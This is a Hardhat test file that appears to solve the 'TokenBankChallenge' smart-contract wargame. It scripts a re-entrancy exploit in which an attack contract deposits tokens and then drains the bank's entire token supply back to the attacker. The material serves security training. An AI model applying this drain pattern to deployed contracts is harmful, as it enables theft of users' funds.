import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let attackContract : Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    const [targetFactory, tokenFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge', deployer),
      ethers.getContractFactory('SimpleERC223Token', deployer),
    ]);

    target = await targetFactory.deploy(attacker.address);

    await target.deployed();

    const tokenAddress = await target.token();

    token = await tokenFactory.attach(tokenAddress);

    await token.deployed();

    target = target.connect(attacker);
    token = token.connect(attacker);
    attackContract = await (
      await ethers.getContractFactory('AttackTokenBankChallenge', deployer)
    ).deploy(target.address);
    await attackContract.deployed();
    attackContract = await attackContract.connect(attacker);
  });

  it('exploit', async () => {
    //Withdraw my tokens
    let withdrawMyTokensTx = await target.withdraw(utils.parseUnits("500000", 18));
    await withdrawMyTokensTx.wait();
    expect (await token.balanceOf(attacker.address)).to.equal(utils.parseUnits("500000", 18));
    expect(await target.balanceOf(attacker.address)).to.equal(0);
    
    //Transfer my tokens to attacker contract
    let transferTx = await token["transfer(address,uint256)"](attackContract.address, utils.parseUnits("500000", 18));
    await transferTx.wait();
    expect (await token.balanceOf(attackContract.address)).to.equal(utils.parseUnits("500000", 18));
    expect(await token.balanceOf(attacker.address)).to.equal(0);

    //Deposit my tokens to tokenBankChallenge
    let depositTx = await attackContract.deposit();
    await depositTx.wait();
    expect(await token.balanceOf(attackContract.address)).to.equal(0);
    expect(await target.balanceOf(attackContract.address)).to.equal(utils.parseUnits("500000", 18));

    //Re-entrancy attack to withdraw all tokens
    let attackTx = await attackContract.attack();
    await attackTx.wait();
    expect(await token.balanceOf(attackContract.address)).to.equal(
      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    );

    //Transfer back the tokens to attacker address
    let transferBackTx = await attackContract.transfer();
    await transferBackTx.wait();
    expect(await token.balanceOf(target.address)).to.equal(0);
    expect(await token.balanceOf(attacker.address)).to.equal(
      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    );
  });
});
